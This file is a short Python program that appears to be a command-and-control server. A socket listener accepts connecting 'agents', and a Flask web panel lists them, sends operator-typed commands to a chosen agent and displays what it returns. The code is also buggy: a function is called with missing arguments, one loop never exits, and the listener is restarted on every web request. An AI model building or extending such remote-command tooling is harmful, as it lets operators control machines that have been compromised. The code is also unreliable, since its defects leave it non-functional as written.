import socket 
import threading,time,flask
from flask import*
from threading import Lock
# linking sockets and web interface

ip_address = '127.0.0.1'
port_number= 1234

thread_index= 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
AGIPS=[]


app = Flask(__name__)

for i in range(20):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    AGIPS.append('')

def handle_connection(connection,address,thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
    
    while CMD_INPUT[thread_index]!='quit':
        #print(msg)
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index]=msg
        while True:
            if CMD_INPUT[thread_index]!='':
                msg = CMD_INPUT[thread_index] 
                connection.send(msg.encode())
                msg = connection.recv(1024).decode()
                CMD_OUTPUT[thread_index]=msg
    close_connection(connection)

def close_connection(connection,thread_index):
    connection.close()
    THREADS[thread_index]=''
    AGIPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''


def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip_address,port_number))
    ss.listen(5)
    global THREADS
    global AGIPS
    while True: 
        connection,address = ss.accept()
        thread_index=len(THREADS)
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS))) 
        THREADS.append(t)
        AGIPS.append(address)
        t.start()
        
@app.before_request
def init_server():
    s1 =threading.Thread(target=server_socket) 
    s1.start()


@app.route('/home')
def index():
    return render_template('index.html')

@app.route('/agents')
def agents():
    return render_template('agents.html',threads=THREADS,ips=AGIPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html",name=agentname)

@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    if request.method=='POST':
        cmd= request.form['command']
        for i in THREADS:
            if agentname in i.name:
                request_index= THREADS.index(i)
        CMD_INPUT[request_index]=cmd
        time.sleep(1)
        cmdoutput= CMD_OUTPUT[request_index]
        return render_template("execute.html",cmdoutput=cmdoutput,name=agentname)

if __name__=='__main__':
    app.run(debug=True)
    
